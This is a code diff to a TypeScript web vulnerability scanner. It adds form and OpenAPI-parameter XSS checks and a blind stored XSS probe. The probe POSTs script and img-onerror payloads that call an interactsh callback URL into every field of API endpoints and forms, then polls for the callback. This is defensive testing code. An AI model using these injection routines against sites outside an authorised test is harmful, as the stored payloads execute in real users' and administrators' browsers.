@@ -1,4 +1,6 @@
-import { ScanContext, ScanFinding, ctxFetch, isInScope } from "./types";
+import { ScanContext, ScanFinding, ctxFetch, isInScope, isWafBlock, handleWafBlock } from "./types";
+import { runOpenApiDiscovery } from "./openapi";
+import { createOastClient } from "./oast";
 
 // Harmless XSS markers — detect reflection without executing code
 const XSS_PROBES = [
@@ -18,7 +20,10 @@ const XSS_CONFIRM_PROBES = [
 const PARAM_NAMES = ["q", "search", "query", "id", "s", "input", "term", "name", "value", "redirect", "url", "keyword", "filter", "text", "msg", "message"];
 
 export async function runXssCheck(ctx: ScanContext): Promise<ScanFinding[]> {
-  const { targetUrl, emit, discoveredEndpoints, profile } = ctx;
+  const { targetUrl, emit, discoveredEndpoints, discoveredForms, discoveredParams, profile } = ctx;
+
+  // Populate OpenAPI-derived params if not already done
+  if (discoveredParams.length === 0) await runOpenApiDiscovery(ctx);
   const findings: ScanFinding[] = [];
   const seen = new Set<string>();
 
@@ -41,6 +46,7 @@ export async function runXssCheck(ctx: ScanContext): Promise<ScanFinding[]> {
         if (!ct.includes("html") && !ct.includes("text") && !ct.includes("json")) continue;
 
         const body = await res.text().catch(() => "");
+        if (isWafBlock(res, body)) { handleWafBlock(ctx, endpoint); break; }
         if (!body.includes(probe.marker)) continue;
 
         // Skip if marker is HTML-entity encoded (safe reflection)
@@ -249,6 +255,188 @@ export async function runXssCheck(ctx: ScanContext): Promise<ScanFinding[]> {
         confidence: 0.90,
       });
       emit({ type: "log", message: `  [STORED XSS CONFIRMED] payload stored then reflected at ${readEp} line=${lineNumber}` });
+    }
+  }
+
+  // ── Blind XSS via OOB (stored XSS in delayed/admin contexts) ───────────────
+  // Reflected XSS detection only catches immediate reflection. Stored XSS that
+  // fires in admin panels, email templates, or PDF renderers needs out-of-band
+  // confirmation. We inject a payload that calls home to the interactsh server
+  // and poll for the callback — if it fires, stored XSS is confirmed.
+  if (profile !== "quick") {
+    const oast = await createOastClient();
+    if (oast) {
+      emit({ type: "log", message: "OOB blind XSS probe enabled (interactsh connected)" });
+      const writeEndpoints = discoveredEndpoints.filter(ep => ep.includes("/api") && isInScope(ctx, ep)).slice(0, 5);
+
+      for (const ep of writeEndpoints) {
+        const tag = `xss-${ep.replace(/[^a-z0-9]/gi, "").slice(-12).toLowerCase()}`;
+        const oobUrl = oast.allocate(tag);
+        // Payload: script tag that calls the OOB URL — fires when any user/admin views the stored content
+        const oobPayload = `<script src="${oobUrl}"></script>`;
+        const imgPayload = `<img src="${oobUrl}" onerror="fetch('${oobUrl}')">`;
+
+        // Inject into common write fields
+        await ctxFetch(ctx, ep, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            name: oobPayload, message: oobPayload, content: oobPayload,
+            comment: imgPayload, title: oobPayload, description: oobPayload,
+            body: oobPayload,
+          }),
+        });
+
+        // Also inject via form fields if available
+        for (const form of discoveredForms.filter(f => f.method === "POST").slice(0, 2)) {
+          const formBody = new URLSearchParams();
+          for (const field of form.fields) formBody.set(field, oobPayload);
+          await ctxFetch(ctx, form.action, {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: formBody.toString(),
+          });
+        }
+
+        // Poll interactsh — give server 8 seconds for async rendering (email/PDF/admin panel)
+        const fired = await oast.poll(tag, 8000);
+        if (fired) {
+          const blindKey = `blind-xss:${ep}`;
+          if (!seen.has(blindKey)) {
+            seen.add(blindKey);
+            findings.push({
+              title: "Blind Stored XSS — Out-of-Band Callback Confirmed",
+              category: "XSS",
+              severity: "critical",
+              endpoint: ep,
+              description: `A blind stored XSS payload was injected into ${ep} and triggered an out-of-band HTTP callback to ${oobUrl}. This confirms the payload was stored server-side and executed in a context invisible to the scanner (admin panel, email template, PDF renderer, or webhook). Any administrator or recipient who views the content will execute the attacker's script.`,
+              evidence: [
+                `POST ${ep}`,
+                `Injected payload: ${oobPayload}`,
+                `OOB callback URL: ${oobUrl}`,
+                `Interactsh callback received: YES (polled after 8s)`,
+                ``,
+                `This is a blind stored XSS — the script executed in a delayed or privileged context.`,
+                `Severity is critical because it likely fires for privileged users (admins, staff).`,
+              ].join("\n"),
+              recommended_fix: "HTML-encode all stored user content before rendering. Implement a strict Content-Security-Policy with script-src 'self'. Sanitize HTML at storage time using DOMPurify or equivalent. Audit all admin/email/PDF rendering pipelines for stored XSS vectors.",
+              cvss_score: 9.3,
+              cwe_id: "CWE-79",
+              scanner_name: "Bug-Finder",
+              scanner_family: "web",
+              confidence: 0.97,
+            });
+            emit({ type: "log", message: `  [BLIND XSS CONFIRMED via OOB] ${ep} → callback at ${oobUrl}` });
+          }
+        } else {
+          emit({ type: "log", message: `  OOB blind XSS probe at ${ep} — no callback (not stored or not rendered yet)` });
+        }
+      }
+    } else {
+      emit({ type: "log", message: "OOB blind XSS skipped — INTERACTSH_URL not configured" });
+    }
+  }
+
+  // ── Form-based XSS injection ────────────────────────────────────────────────
+  if (discoveredForms.length > 0) {
+    emit({ type: "log", message: `Testing ${discoveredForms.length} discovered form(s) for XSS...` });
+    for (const form of discoveredForms.slice(0, profile === "quick" ? 2 : 5)) {
+      const probe = XSS_PROBES[0]!;
+      const confirmProbe = XSS_CONFIRM_PROBES[0]!;
+      for (const field of form.fields.slice(0, 4)) {
+        const formKey = `form:${form.action}:${field}`;
+        if (seen.has(formKey)) continue;
+
+        const submitForm = async (payload: string) => {
+          const body = new URLSearchParams();
+          for (const f of form.fields) body.set(f, f === field ? payload : "test");
+          return ctxFetch(ctx, form.action, {
+            method: form.method,
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: body.toString(),
+          });
+        };
+
+        const res = await submitForm(probe.payload);
+        if (!res) continue;
+        const ct = res.headers.get("content-type") ?? "";
+        if (!ct.includes("html") && !ct.includes("text") && !ct.includes("json")) continue;
+        const respBody = await res.text().catch(() => "");
+        if (!respBody.includes(probe.marker)) continue;
+        const encodedMarker = probe.marker.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        if (respBody.includes(encodedMarker) && !respBody.includes(`<${probe.marker.replace(/[<>]/g, "")}`)) continue;
+
+        const confirmRes = await submitForm(confirmProbe.payload);
+        const confirmBody = confirmRes ? await confirmRes.text().catch(() => "") : "";
+        if (!confirmBody.includes(confirmProbe.marker)) continue;
+
+        seen.add(formKey);
+        const offset = respBody.indexOf(probe.marker);
+        findings.push({
+          title: `Reflected XSS in Form Field: ${field}`,
+          category: "XSS",
+          severity: "high",
+          endpoint: form.action,
+          description: `Form field "${field}" at ${form.action} reflects unsanitized input into the response. Confirmed with two independent markers via form submission (${form.method} application/x-www-form-urlencoded).`,
+          evidence: [
+            `${form.method} ${form.action}`,
+            `Content-Type: application/x-www-form-urlencoded`,
+            `Field: ${field}=${probe.payload}`,
+            `Marker reflected unencoded at byte offset ${offset}`,
+            `Context: ${respBody.slice(Math.max(0, offset - 100), offset + 100)}`,
+            `Confirmation: "${confirmProbe.marker}" also reflected`,
+          ].join("\n"),
+          recommended_fix: "HTML-encode all form field values before rendering. Use auto-escaping templates.",
+          cvss_score: 7.4,
+          cwe_id: "CWE-79",
+          scanner_name: "Bug-Finder",
+          scanner_family: "web",
+          confidence: 0.92,
+        });
+        emit({ type: "log", message: `  [XSS FORM] ${form.action} field=${field}` });
+      }
+    }
+  }
+
+  // ── OpenAPI param-driven XSS ────────────────────────────────────────────────
+  if (discoveredParams.length > 0 && profile !== "quick") {
+    const queryParams = discoveredParams.filter(p => p.location === "query").slice(0, 10);
+    emit({ type: "log", message: `Testing ${queryParams.length} OpenAPI-discovered query params for XSS...` });
+    for (const dp of queryParams) {
+      const [method, url] = dp.endpoint.split(" ") as [string, string];
+      if (method !== "GET" && method !== "POST") continue;
+      const probe = XSS_PROBES[0]!;
+      const testUrl = `${url}${url.includes("?") ? "&" : "?"}${dp.name}=${encodeURIComponent(probe.payload)}`;
+      const paramKey = `openapi:${url}:${dp.name}`;
+      if (seen.has(paramKey)) continue;
+      const res = await ctxFetch(ctx, testUrl);
+      if (!res) continue;
+      const body = await res.text().catch(() => "");
+      if (!body.includes(probe.marker)) continue;
+      const encodedMarker = probe.marker.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+      if (body.includes(encodedMarker)) continue;
+      const confirmProbe = XSS_CONFIRM_PROBES[0]!;
+      const confirmUrl = `${url}${url.includes("?") ? "&" : "?"}${dp.name}=${encodeURIComponent(confirmProbe.payload)}`;
+      const confirmRes = await ctxFetch(ctx, confirmUrl);
+      const confirmBody = confirmRes ? await confirmRes.text().catch(() => "") : "";
+      if (!confirmBody.includes(confirmProbe.marker)) continue;
+      seen.add(paramKey);
+      const offset = body.indexOf(probe.marker);
+      findings.push({
+        title: `Reflected XSS in OpenAPI Parameter: ${dp.name}`,
+        category: "XSS",
+        severity: "high",
+        endpoint: url,
+        description: `Parameter "${dp.name}" (discovered via OpenAPI spec) reflects unsanitized input. Confirmed with two independent markers.`,
+        evidence: [`GET ${testUrl}`, `Marker at offset ${offset}`, `Context: ${body.slice(Math.max(0, offset - 100), offset + 100)}`].join("\n"),
+        recommended_fix: "HTML-encode all output. Use auto-escaping templates and Content-Security-Policy.",
+        cvss_score: 7.4,
+        cwe_id: "CWE-79",
+        scanner_name: "Bug-Finder",
+        scanner_family: "web",
+        confidence: 0.91,
+      });
+      emit({ type: "log", message: `  [XSS OpenAPI-param] ${url} param=${dp.name}` });
     }
   }
 
